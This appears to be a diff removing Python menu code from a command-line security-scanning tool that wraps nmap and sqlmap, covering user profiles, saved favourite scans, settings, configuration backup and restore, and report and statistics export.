-                        print(f"  {i}. {scan.get('name', 'Unknown')} on {scan.get('target', 'Unknown')} ({scan_date})")
-                
-                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.EDIT} Change Username")
-                print(f"{Colors.GREEN}2.{Colors.END} {Icons.CHART} View Detailed Stats")
-                print(f"{Colors.GREEN}3.{Colors.END} {Icons.CLOCK} View Activity History")
-                print(f"{Colors.GREEN}4.{Colors.END} {Icons.STAR} Manage Favorites")
-                print(f"{Colors.GREEN}5.{Colors.END} {Icons.TRASH} Clear Profile Data")
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-                
-                choice = self.get_menu_choice(5)
-                
-                if choice == 1:
-                    self.change_username()
-                elif choice == 2:
-                    self.view_detailed_stats()
-                elif choice == 3:
-                    self.view_activity_history()
-                elif choice == 4:
-                    self.manage_favorites()
-                elif choice == 5:
-                    self.clear_profile_data()
-                elif choice == 0:
-                    break
-        except Exception as e:
-            self.db_manager.log_error("ProfileMenu", str(e))
-        
-        return True
-    
-    def change_username(self):
-        try:
-            current_username = self.config_manager.get('username', 'SecScanUser')
-            print(f"\n{Colors.CYAN}Current username: {Colors.YELLOW}{current_username}{Colors.END}")
-            
-            new_username = input(f"{Colors.WHITE}Enter new username (3-30 characters): ").strip()
-            
-            if len(new_username) >= 3 and len(new_username) <= 30 and new_username.replace('_', '').replace('-', '').isalnum():
-                self.config_manager.set('username', new_username)
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Username updated successfully!{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Invalid username! Use 3-30 alphanumeric characters, underscores, or hyphens.{Colors.END}")
-            
-            self.wait_for_key()
-        except Exception as e:
-            self.db_manager.log_error("ChangeUsername", str(e))
-    
-    def view_detailed_stats(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.CHART} Detailed User Statistics{Colors.END}")
-            
-            stats = self.db_manager.get_scan_statistics()
-            config_scans = self.config_manager.get('total_scans', 0)
-            
-            print(f"\n{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            print(f"{Colors.CYAN}📊 USER STATISTICS{Colors.END}")
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            print(f"{Colors.WHITE}Configuration Tracked Scans: {Colors.GREEN}{config_scans}{Colors.END}")
-            print(f"{Colors.WHITE}Database Tracked Scans: {Colors.YELLOW}{stats['total_scans']}{Colors.END}")
-            print(f"{Colors.WHITE}Reports Generated: {Colors.BLUE}{stats['total_reports']}{Colors.END}")
-            print(f"{Colors.WHITE}Vulnerabilities Found: {Colors.RED}{stats['total_vulnerabilities']}{Colors.END}")
-            print(f"{Colors.WHITE}Unique Targets: {Colors.MAGENTA}{stats['total_targets']}{Colors.END}")
-            
-            if config_scans > 0:
-                recent_scans = self.config_manager.get('recent_scans', [])
-                print(f"\n{Colors.CYAN}Recent Scan Performance:{Colors.END}")
-                
-                total_duration = sum(scan.get('duration', 0) for scan in recent_scans)
-                avg_duration = total_duration / len(recent_scans) if recent_scans else 0
-                
-                print(f"{Colors.WHITE}Recent Scans Count: {Colors.GREEN}{len(recent_scans)}{Colors.END}")
-                print(f"{Colors.WHITE}Average Duration: {Colors.YELLOW}{avg_duration:.2f} seconds{Colors.END}")
-                
-                # Show scan type breakdown from recent scans
-                nmap_count = sum(1 for scan in recent_scans if scan.get('scan_type') == 'nmap')
-                sqlmap_count = sum(1 for scan in recent_scans if scan.get('scan_type') == 'sqlmap')
-                
-                print(f"{Colors.WHITE}Recent Nmap Scans: {Colors.GREEN}{nmap_count}{Colors.END}")
-                print(f"{Colors.WHITE}Recent SQLmap Scans: {Colors.BLUE}{sqlmap_count}{Colors.END}")
-            
-            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ViewDetailedStats", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error viewing stats: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def view_activity_history(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.CLOCK} Activity History{Colors.END}")
-            
-            recent_scans = self.config_manager.get('recent_scans', [])
-            
-            if not recent_scans:
-                print(f"\n{Colors.YELLOW}{Icons.INFO} No recent activity found{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Last {len(recent_scans)} scans:{Colors.END}")
-            print("=" * 80)
-            
-            for i, scan in enumerate(recent_scans, 1):
-                date_str = scan.get('date', 'Unknown')[:19].replace('T', ' ')
-                scan_name = scan.get('name', 'Unknown')
-                target = scan.get('target', 'Unknown')
-                scan_type = scan.get('scan_type', 'Unknown').upper()
-                mode = scan.get('mode', 'Unknown').upper()
-                duration = scan.get('duration', 0)
-                
-                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {Colors.YELLOW}{scan_name}{Colors.END}")
-                print(f"     Target: {target} | Type: {scan_type} | Mode: {mode}")
-                print(f"     Date: {date_str} | Duration: {duration:.1f}s")
-                print()
-            
-            print("=" * 80)
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ViewActivityHistory", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error viewing activity: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def manage_favorites(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.STAR} Manage Favorite Scans{Colors.END}")
-            
-            favorites = self.config_manager.get('favorite_scans', [])
-            
-            if not favorites:
-                print(f"\n{Colors.YELLOW}{Icons.INFO} No favorite scans saved{Colors.END}")
-                print(f"{Colors.CYAN}You can add favorites by marking scans during execution{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Your favorite scans:{Colors.END}")
-            print("=" * 60)
-            
-            for i, fav in enumerate(favorites, 1):
-                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {fav.get('name', 'Unknown')} ({fav.get('scan_type', 'Unknown')})")
-                print(f"     Command: {fav.get('command', 'Unknown')}")
-                print()
-            
-            print("=" * 60)
-            
-            print(f"\n{Colors.GREEN}1.{Colors.END} Add New Favorite")
-            print(f"{Colors.GREEN}2.{Colors.END} Remove Favorite")
-            print(f"{Colors.GREEN}3.{Colors.END} Run Favorite Scan")
-            print(f"{Colors.CYAN}0.{Colors.END} Back")
-            
-            choice = self.get_menu_choice(3)
-            
-            if choice == 1:
-                self.add_favorite_scan()
-            elif choice == 2:
-                self.remove_favorite_scan()
-            elif choice == 3:
-                self.run_favorite_scan()
-            
-        except Exception as e:
-            self.db_manager.log_error("ManageFavorites", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Error managing favorites: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def add_favorite_scan(self):
-        try:
-            print(f"\n{Colors.BOLD}Add Favorite Scan{Colors.END}")
-            
-            name = input(f"{Colors.CYAN}Favorite name: {Colors.END}").strip()
-            if not name:
-                return
-            
-            print(f"\n{Colors.CYAN}Scan type:{Colors.END}")
-            print(f"{Colors.GREEN}1.{Colors.END} Nmap")
-            print(f"{Colors.GREEN}2.{Colors.END} SQLmap")
-            
-            type_choice = self.get_menu_choice(2)
-            scan_type = 'nmap' if type_choice == 1 else 'sqlmap'
-            
-            command = input(f"{Colors.CYAN}Command parameters: {Colors.END}").strip()
-            if not command:
-                return
-            
-            favorite = {
-                'name': name,
-                'scan_type': scan_type,
-                'command': command,
-                'created_date': datetime.now().isoformat()
-            }
-            
-            favorites = self.config_manager.get('favorite_scans', [])
-            favorites.append(favorite)
-            
-            if self.config_manager.set('favorite_scans', favorites):
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Favorite scan added{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Failed to save favorite{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("AddFavorite", str(e))
-    
-    def remove_favorite_scan(self):
-        try:
-            favorites = self.config_manager.get('favorite_scans', [])
-            
-            if not favorites:
-                print(f"{Colors.YELLOW}{Icons.INFO} No favorites to remove{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Select favorite to remove:{Colors.END}")
-            for i, fav in enumerate(favorites, 1):
-                print(f"{Colors.GREEN}{i}.{Colors.END} {fav.get('name', 'Unknown')}")
-            
-            choice = self.get_menu_choice(len(favorites))
-            
-            if choice > 0 and choice <= len(favorites):
-                removed_fav = favorites.pop(choice - 1)
-                
-                if self.config_manager.set('favorite_scans', favorites):
-                    print(f"{Colors.GREEN}{Icons.SUCCESS} Removed '{removed_fav.get('name', 'Unknown')}'{Colors.END}")
-                else:
-                    print(f"{Colors.RED}{Icons.ERROR} Failed to remove favorite{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("RemoveFavorite", str(e))
-    
-    def run_favorite_scan(self):
-        try:
-            favorites = self.config_manager.get('favorite_scans', [])
-            
-            if not favorites:
-                print(f"{Colors.YELLOW}{Icons.INFO} No favorites available{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Select favorite to run:{Colors.END}")
-            for i, fav in enumerate(favorites, 1):
-                print(f"{Colors.GREEN}{i}.{Colors.END} {fav.get('name', 'Unknown')} ({fav.get('scan_type', 'Unknown')})")
-            
-            choice = self.get_menu_choice(len(favorites))
-            
-            if choice > 0 and choice <= len(favorites):
-                selected_fav = favorites[choice - 1]
-                
-                target = self.get_target_input()
-                if not target:
-                    return
-                
-                notes = input(f"\n{Colors.CYAN}Add notes for this scan (optional): {Colors.END}").strip()
-                
-                print(f"\n{Colors.YELLOW}{Icons.WARNING} Run favorite '{selected_fav.get('name')}' on '{target}'? (y/n): {Colors.END}")
-                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
-                
-                if confirm in ['y', 'yes']:
-                    self.perform_scan(
-                        selected_fav.get('scan_type'),
-                        target,
-                        selected_fav.get('command'),
-                        'favorite',
-                        selected_fav.get('name'),
-                        notes
-                    )
-            
-        except Exception as e:
-            self.db_manager.log_error("RunFavorite", str(e))
-    
-    def clear_profile_data(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.TRASH} Clear Profile Data{Colors.END}")
-            print(f"{Colors.YELLOW}{Icons.WARNING} This will clear:{Colors.END}")
-            print(f"  • Recent scan history")
-            print(f"  • Favorite scans")
-            print(f"  • Scan count")
-            print(f"  • Activity logs")
-            
-            print(f"\n{Colors.RED}Are you sure you want to clear all profile data? (type 'CLEAR'): {Colors.END}")
-            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
-            
-            if confirm == 'CLEAR':
-                self.config_manager.set('total_scans', 0)
-                self.config_manager.set('recent_scans', [])
-                self.config_manager.set('favorite_scans', [])
-                
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Profile data cleared{Colors.END}")
-            else:
-                print(f"{Colors.YELLOW}{Icons.INFO} Operation cancelled{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ClearProfile", str(e))
-    
-    def settings_menu(self):
-        try:
-            while True:
-                self.clear_screen()
-                print(f"\n{Colors.BOLD}{Icons.KEY} SETTINGS & CONFIGURATION{Colors.END}")
-                print(f"{Colors.CYAN}Configure application settings and preferences{Colors.END}")
-                
-                auto_save = self.config_manager.get('advanced_settings.auto_save_reports', True)
-                show_progress = self.config_manager.get('advanced_settings.show_progress', True)
-                report_format = self.config_manager.get('advanced_settings.report_format', 'html')
-                timeout = self.config_manager.get('advanced_settings.timeout_duration', 300)
-                
-                print(f"\n{Colors.CYAN}Current Settings:{Colors.END}")
-                print(f"{Colors.WHITE}Auto-save Reports: {Colors.GREEN if auto_save else Colors.RED}{'Enabled' if auto_save else 'Disabled'}{Colors.END}")
-                print(f"{Colors.WHITE}Show Progress: {Colors.GREEN if show_progress else Colors.RED}{'Enabled' if show_progress else 'Disabled'}{Colors.END}")
-                print(f"{Colors.WHITE}Default Report Format: {Colors.YELLOW}{report_format.upper()}{Colors.END}")
-                print(f"{Colors.WHITE}Scan Timeout: {Colors.YELLOW}{timeout} seconds{Colors.END}")
-                
-                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.GEAR} General Settings")
-                print(f"{Colors.GREEN}2.{Colors.END} {Icons.CHART} Report Settings")
-                print(f"{Colors.GREEN}3.{Colors.END} {Icons.CLOCK} Performance Settings")
-                print(f"{Colors.GREEN}4.{Colors.END} {Icons.SAVE} Backup Configuration")
-                print(f"{Colors.GREEN}5.{Colors.END} {Icons.UPLOAD} Restore Configuration")
-                print(f"{Colors.GREEN}6.{Colors.END} {Icons.TRASH} Reset to Defaults")
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-                
-                choice = self.get_menu_choice(6)
-                
-                if choice == 1:
-                    self.general_settings()
-                elif choice == 2:
-                    self.report_settings()
-                elif choice == 3:
-                    self.performance_settings()
-                elif choice == 4:
-                    self.backup_configuration()
-                elif choice == 5:
-                    self.restore_configuration()
-                elif choice == 6:
-                    self.reset_configuration()
-                elif choice == 0:
-                    break
-        except Exception as e:
-            self.db_manager.log_error("SettingsMenu", str(e))
-        
-        return True
-    
-    def general_settings(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.GEAR} General Settings{Colors.END}")
-            
-            print(f"\n{Colors.GREEN}1.{Colors.END} Toggle Auto-save Reports")
-            print(f"{Colors.GREEN}2.{Colors.END} Toggle Progress Display")
-            print(f"{Colors.GREEN}3.{Colors.END} Change Theme")
-            print(f"{Colors.CYAN}0.{Colors.END} Back")
-            
-            choice = self.get_menu_choice(3)
-            
-            if choice == 1:
-                current = self.config_manager.get('advanced_settings.auto_save_reports', True)
-                self.config_manager.set('advanced_settings.auto_save_reports', not current)
-                status = "enabled" if not current else "disabled"
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Auto-save reports {status}{Colors.END}")
-                
-            elif choice == 2:
-                current = self.config_manager.get('advanced_settings.show_progress', True)
-                self.config_manager.set('advanced_settings.show_progress', not current)
-                status = "enabled" if not current else "disabled"
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Progress display {status}{Colors.END}")
-                
-            elif choice == 3:
-                current_theme = self.config_manager.get('theme', 'dark')
-                new_theme = 'light' if current_theme == 'dark' else 'dark'
-                self.config_manager.set('theme', new_theme)
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Theme changed to {new_theme}{Colors.END}")
-            
-            if choice > 0:
-                self.wait_for_key()
-                
-        except Exception as e:
-            self.db_manager.log_error("GeneralSettings", str(e))
-    
-    def report_settings(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.CHART} Report Settings{Colors.END}")
-            
-            print(f"\n{Colors.CYAN}Default Report Format:{Colors.END}")
-            print(f"{Colors.GREEN}1.{Colors.END} HTML (Recommended)")
-            print(f"{Colors.GREEN}2.{Colors.END} Text")
-            print(f"{Colors.GREEN}3.{Colors.END} JSON")
-            print(f"{Colors.CYAN}0.{Colors.END} Back")
-            
-            choice = self.get_menu_choice(3)
-            
-            if choice == 1:
-                self.config_manager.set('advanced_settings.report_format', 'html')
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Default format set to HTML{Colors.END}")
-            elif choice == 2:
-                self.config_manager.set('advanced_settings.report_format', 'txt')
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Default format set to Text{Colors.END}")
-            elif choice == 3:
-                self.config_manager.set('advanced_settings.report_format', 'json')
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Default format set to JSON{Colors.END}")
-            
-            if choice > 0:
-                self.wait_for_key()
-                
-        except Exception as e:
-            self.db_manager.log_error("ReportSettings", str(e))
-    
-    def performance_settings(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.CLOCK} Performance Settings{Colors.END}")
-            
-            current_timeout = self.config_manager.get('advanced_settings.timeout_duration', 300)
-            current_concurrent = self.config_manager.get('advanced_settings.concurrent_scans', 5)
-            
-            print(f"\n{Colors.CYAN}Current Settings:{Colors.END}")
-            print(f"Scan Timeout: {current_timeout} seconds")
-            print(f"Max Concurrent Scans: {current_concurrent}")
-            
-            print(f"\n{Colors.GREEN}1.{Colors.END} Change Scan Timeout")
-            print(f"{Colors.GREEN}2.{Colors.END} Change Concurrent Scans")
-            print(f"{Colors.GREEN}3.{Colors.END} Enable Database Cleanup")
-            print(f"{Colors.CYAN}0.{Colors.END} Back")
-            
-            choice = self.get_menu_choice(3)
-            
-            if choice == 1:
-                try:
-                    new_timeout = int(input(f"{Colors.CYAN}Enter timeout in seconds (60-3600): {Colors.END}"))
-                    if 60 <= new_timeout <= 3600:
-                        self.config_manager.set('advanced_settings.timeout_duration', new_timeout)
-                        print(f"{Colors.GREEN}{Icons.SUCCESS} Timeout set to {new_timeout} seconds{Colors.END}")
-                    else:
-                        print(f"{Colors.RED}{Icons.ERROR} Invalid timeout value{Colors.END}")
-                except ValueError:
-                    print(f"{Colors.RED}{Icons.ERROR} Invalid number{Colors.END}")
-                    
-            elif choice == 2:
-                try:
-                    new_concurrent = int(input(f"{Colors.CYAN}Enter max concurrent scans (1-10): {Colors.END}"))
-                    if 1 <= new_concurrent <= 10:
-                        self.config_manager.set('advanced_settings.concurrent_scans', new_concurrent)
-                        print(f"{Colors.GREEN}{Icons.SUCCESS} Concurrent scans set to {new_concurrent}{Colors.END}")
-                    else:
-                        print(f"{Colors.RED}{Icons.ERROR} Invalid value{Colors.END}")
-                except ValueError:
-                    print(f"{Colors.RED}{Icons.ERROR} Invalid number{Colors.END}")
-                    
-            elif choice == 3:
-                if self.db_manager.cleanup_old_data():
-                    print(f"{Colors.GREEN}{Icons.SUCCESS} Database cleanup completed{Colors.END}")
-                else:
-                    print(f"{Colors.RED}{Icons.ERROR} Cleanup failed{Colors.END}")
-            
-            if choice > 0:
-                self.wait_for_key()
-                
-        except Exception as e:
-            self.db_manager.log_error("PerformanceSettings", str(e))
-    
-    def backup_configuration(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.SAVE} Backup Configuration{Colors.END}")
-            
-            backup_file = self.config_manager.backup_config()
-            
-            if backup_file:
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Configuration backed up to: {backup_file}{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Backup failed{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("BackupConfig", str(e))
-    
-    def restore_configuration(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.UPLOAD} Restore Configuration{Colors.END}")
-            
-            backup_files = []
-            try:
-                backup_files = [f for f in os.listdir("backups") if f.startswith("config_backup_") and f.endswith(".json")]
-            except:
-                pass
-            
-            if not backup_files:
-                print(f"{Colors.YELLOW}{Icons.INFO} No backup files found{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Available backups:{Colors.END}")
-            for i, backup in enumerate(backup_files, 1):
-                print(f"{Colors.GREEN}{i}.{Colors.END} {backup}")
-            
-            choice = self.get_menu_choice(len(backup_files))
-            
-            if choice > 0 and choice <= len(backup_files):
-                selected_backup = os.path.join("backups", backup_files[choice - 1])
-                
-                print(f"{Colors.YELLOW}{Icons.WARNING} This will replace current configuration. Continue? (y/n): {Colors.END}")
-                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
-                
-                if confirm in ['y', 'yes']:
-                    try:
-                        shutil.copy2(selected_backup, self.config_manager.config_file)
-                        self.config_manager.config = self.config_manager._load_config()
-                        print(f"{Colors.GREEN}{Icons.SUCCESS} Configuration restored{Colors.END}")
-                    except Exception as e:
-                        print(f"{Colors.RED}{Icons.ERROR} Restore failed: {e}{Colors.END}")
-                else:
-                    print(f"{Colors.YELLOW}{Icons.INFO} Restore cancelled{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("RestoreConfig", str(e))
-    
-    def reset_configuration(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.TRASH} Reset Configuration{Colors.END}")
-            print(f"{Colors.YELLOW}{Icons.WARNING} This will reset all settings to defaults{Colors.END}")
-            print(f"{Colors.RED}Type 'RESET' to confirm: {Colors.END}")
-            
-            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
-            
-            if confirm == 'RESET':
-                username = self.config_manager.get('username', 'SecScanUser')  # Preserve username
-                
-                self.config_manager.config = self.config_manager.default_config.copy()
-                self.config_manager.set('username', username)  # Restore username
-                
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Configuration reset to defaults{Colors.END}")
-            else:
-                print(f"{Colors.YELLOW}{Icons.INFO} Reset cancelled{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ResetConfig", str(e))
-    
-    def export_backup_menu(self):
-        try:
-            while True:
-                self.clear_screen()
-                print(f"\n{Colors.BOLD}{Icons.EXPORT} EXPORT & BACKUP{Colors.END}")
-                print(f"{Colors.CYAN}Export data and manage backups{Colors.END}")
-                
-                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.EXPORT} Export All Reports")
-                print(f"{Colors.GREEN}2.{Colors.END} {Icons.SAVE} Create Full Backup")
-                print(f"{Colors.GREEN}3.{Colors.END} {Icons.UPLOAD} Restore from Backup")
-                print(f"{Colors.GREEN}4.{Colors.END} {Icons.FOLDER} Archive Old Data")
-                print(f"{Colors.GREEN}5.{Colors.END} {Icons.CHART} Export Statistics")
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-                
-                choice = self.get_menu_choice(5)
-                
-                if choice == 1:
-                    self.export_all_reports()
-                elif choice == 2:
-                    self.create_full_backup()
-                elif choice == 3:
-                    self.restore_from_backup()
-                elif choice == 4:
-                    self.archive_old_data()
-                elif choice == 5:
-                    self.export_statistics()
-                elif choice == 0:
-                    break
-        except Exception as e:
-            self.db_manager.log_error("ExportBackupMenu", str(e))
-        
-        return True
-    
-    def export_all_reports(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.EXPORT} Export All Reports{Colors.END}")
-            
-            reports = self.db_manager.get_reports(1000)  # Get all reports
-            
-            if not reports:
-                print(f"{Colors.YELLOW}{Icons.INFO} No reports to export{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            export_dir = f"export_{timestamp}"
-            os.makedirs(export_dir, exist_ok=True)
-            
-            print(f"{Colors.CYAN}Exporting {len(reports)} reports...{Colors.END}")
-            
-            progress = AdvancedProgressBar(total=len(reports), title="Exporting Reports")
-            progress.start()
-            
-            exported_count = 0
-            
-            for i, report in enumerate(reports):
-                try:
-                    source_file = report[6]  # file_path
-                    if os.path.exists(source_file):
-                        filename = os.path.basename(source_file)
-                        dest_file = os.path.join(export_dir, filename)
-                        shutil.copy2(source_file, dest_file)
-                        exported_count += 1
-                    
-                    progress.update(i + 1)
-                except Exception:
-                    continue
-            
-            progress.stop()
-            
-            # Create metadata file
-            metadata = {
-                'export_date': datetime.now().isoformat(),
-                'total_reports': len(reports),
-                'exported_files': exported_count,
-                'reports': [
-                    {
-                        'id': r[0], 'name': r[1], 'target': r[2], 'scan_type': r[3],
-                        'mode': r[4], 'created_date': r[5], 'file_path': r[6]
-                    } for r in reports
-                ]
-            }
-            
-            with open(os.path.join(export_dir, 'metadata.json'), 'w') as f:
-                json.dump(metadata, f, indent=2)
-            
-            print(f"{Colors.GREEN}{Icons.SUCCESS} Exported {exported_count} reports to '{export_dir}'{Colors.END}")
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ExportAllReports", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Export failed: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def create_full_backup(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.SAVE} Create Full Backup{Colors.END}")
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            backup_dir = f"full_backup_{timestamp}"
-            
-            print(f"{Colors.CYAN}Creating full backup...{Colors.END}")
-            
-            progress = AdvancedProgressBar(total=100, title="Creating Backup")
-            progress.start()
-            
-            # Create backup directory
-            os.makedirs(backup_dir, exist_ok=True)
-            progress.update(10)
-            
-            # Backup configuration
-            if os.path.exists(self.config_manager.config_file):
-                shutil.copy2(self.config_manager.config_file, os.path.join(backup_dir, "config.json"))
-            progress.update(20)
-            
-            # Backup database
-            if os.path.exists(self.db_manager.db_file):
-                shutil.copy2(self.db_manager.db_file, os.path.join(backup_dir, "database.db"))
-            progress.update(40)
-            
-            # Backup reports directory
-            if os.path.exists("reports"):
-                shutil.copytree("reports", os.path.join(backup_dir, "reports"))
-            progress.update(80)
-            
-            # Create backup info
-            backup_info = {
-                'backup_date': datetime.now().isoformat(),
-                'version': '2.0',
-                'files': {
-                    'config': 'config.json',
-                    'database': 'database.db',
-                    'reports': 'reports/'
-                }
-            }
-            
-            with open(os.path.join(backup_dir, 'backup_info.json'), 'w') as f:
-                json.dump(backup_info, f, indent=2)
-            
-            progress.update(90)
-            
-            # Create ZIP archive
-            zip_filename = f"{backup_dir}.zip"
-            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for root, dirs, files in os.walk(backup_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        arc_name = os.path.relpath(file_path, backup_dir)
-                        zipf.write(file_path, arc_name)
-            
-            # Remove temporary directory
-            shutil.rmtree(backup_dir)
-            
-            progress.update(100)
-            progress.stop()
-            
-            file_size = os.path.getsize(zip_filename) / (1024 * 1024)  # MB
-            print(f"{Colors.GREEN}{Icons.SUCCESS} Full backup created: {zip_filename} ({file_size:.1f} MB){Colors.END}")
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("CreateFullBackup", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Backup failed: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def restore_from_backup(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.UPLOAD} Restore from Backup{Colors.END}")
-            
-            backup_files = [f for f in os.listdir('.') if f.startswith('full_backup_') and f.endswith('.zip')]
-            
-            if not backup_files:
-                print(f"{Colors.YELLOW}{Icons.INFO} No backup files found{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            print(f"\n{Colors.CYAN}Available backups:{Colors.END}")
-            for i, backup in enumerate(backup_files, 1):
-                file_size = os.path.getsize(backup) / (1024 * 1024)  # MB
-                print(f"{Colors.GREEN}{i}.{Colors.END} {backup} ({file_size:.1f} MB)")
-            
-            choice = self.get_menu_choice(len(backup_files))
-            
-            if choice > 0 and choice <= len(backup_files):
-                selected_backup = backup_files[choice - 1]
-                
-                print(f"{Colors.RED}{Icons.WARNING} This will REPLACE all current data! Continue? (type 'RESTORE'): {Colors.END}")
-                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
-                
-                if confirm == 'RESTORE':
-                    print(f"{Colors.CYAN}Restoring from backup...{Colors.END}")
-                    
-                    # Extract backup
-                    temp_dir = "temp_restore"
-                    with zipfile.ZipFile(selected_backup, 'r') as zipf:
-                        zipf.extractall(temp_dir)
-                    
-                    # Restore files
-                    if os.path.exists(os.path.join(temp_dir, 'config.json')):
-                        shutil.copy2(os.path.join(temp_dir, 'config.json'), self.config_manager.config_file)
-                    
-                    if os.path.exists(os.path.join(temp_dir, 'database.db')):
-                        shutil.copy2(os.path.join(temp_dir, 'database.db'), self.db_manager.db_file)
-                    
-                    if os.path.exists(os.path.join(temp_dir, 'reports')):
-                        if os.path.exists('reports'):
-                            shutil.rmtree('reports')
-                        shutil.copytree(os.path.join(temp_dir, 'reports'), 'reports')
-                    
-                    # Cleanup
-                    shutil.rmtree(temp_dir)
-                    
-                    # Reload configuration
-                    self.config_manager.config = self.config_manager._load_config()
-                    
-                    print(f"{Colors.GREEN}{Icons.SUCCESS} Backup restored successfully{Colors.END}")
-                else:
-                    print(f"{Colors.YELLOW}{Icons.INFO} Restore cancelled{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("RestoreBackup", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Restore failed: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def archive_old_data(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.FOLDER} Archive Old Data{Colors.END}")
-            
-            days = input(f"{Colors.CYAN}Archive data older than how many days? (default: 30): {Colors.END}").strip()
-            
-            try:
-                days = int(days) if days else 30
-            except ValueError:
-                days = 30
-            
-            if self.db_manager.cleanup_old_data(days):
-                print(f"{Colors.GREEN}{Icons.SUCCESS} Archived data older than {days} days{Colors.END}")
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Archive operation failed{Colors.END}")
-            
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ArchiveData", str(e))
-    
-    def export_statistics(self):
-        try:
-            print(f"\n{Colors.BOLD}{Icons.CHART} Export Statistics{Colors.END}")
-            
-            stats = self.db_manager.get_scan_statistics()
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            stats_file = f"statistics_export_{timestamp}.json"
-            
-            export_data = {
-                'export_metadata': {
-                    'generated_at': datetime.now().isoformat(),
-                    'tool': 'SecScan Automator',
-                    'version': '2.0'
-                },
-                'statistics': stats,
-                'user_info': {
-                    'username': self.config_manager.get('username', 'SecScanUser'),
-                    'total_scans': self.config_manager.get('total_scans', 0),
-                    'member_since': self.config_manager.get('created_date', datetime.now().isoformat())
-                }
-            }
-            
-            with open(stats_file, 'w', encoding='utf-8') as f:
-                json.dump(export_data, f, indent=2, ensure_ascii=False)
-            
